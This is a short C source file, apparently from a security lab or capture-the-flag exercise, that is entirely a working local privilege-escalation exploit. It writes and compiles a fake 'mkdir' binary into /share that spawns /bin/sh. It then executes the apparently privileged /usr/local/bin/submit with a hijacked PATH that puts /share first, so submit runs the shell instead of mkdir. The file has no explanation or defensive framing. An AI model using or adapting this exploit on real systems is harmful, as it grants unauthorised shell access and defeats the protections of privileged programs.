#include<stdio.h>

int main(){
	char prog[] = "#include<stdio.h> \nint main(){\nsystem(\"/bin/sh\");\nexit(0);\n}";
	FILE *fp;
	fp = fopen("/share/mkdir.c", "w");
	if(fwrite((const void*)prog, sizeof(char), 60, fp) != 60){
        return -1;	}
	fclose(fp);
	system("gcc /share/mkdir.c -o /share/mkdir");
	char *argv[] = { "/usr/local/bin/submit", "-s", "env", 0 };
	char *envp[] =
	{
		"HOME=/",
		"PATH=/share:/bin:/usr/bin",
		"TZ=UTC0",
		"USER=beelzebub",
		"LOGNAME=tarzan",
		0
	};
	execve(argv[0], &argv[0], envp);
	fprintf(stderr, "Oops!\n");
	return -1;
}
